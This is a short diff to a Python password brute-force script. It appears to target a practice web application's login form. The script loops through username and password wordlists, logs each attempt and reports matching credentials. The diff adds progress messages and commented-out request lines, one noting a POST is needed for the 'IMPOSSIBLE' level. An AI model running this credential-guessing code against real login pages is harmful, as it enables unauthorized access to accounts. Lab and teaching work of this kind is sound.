@@ -25,7 +25,13 @@ def attack(session, dict_user, users, dict_pass, passw):
         u = u.rstrip('\n')
         for p in passwords:
             p = p.rstrip('\n')
+            print("Trying with: Username: {} Password: {}".format(u, p))
             page_content = session.login(bruteforce_path, u, p)
+            #print(page_content)
             if success_msg in page_content:
                 print("   Credentials found!\n   Username: {}\n   Password: {}\n".format(u,p))
 
+    print("Finished....")
+
+#    r = self.__session.get(url=login_url, params=data, cookies=self.__cookies)
+#     r = self.__session.post(url=login_url, data=data, cookies=self.__cookies) ######## NEED to do a POST for IMPOSSIBLE
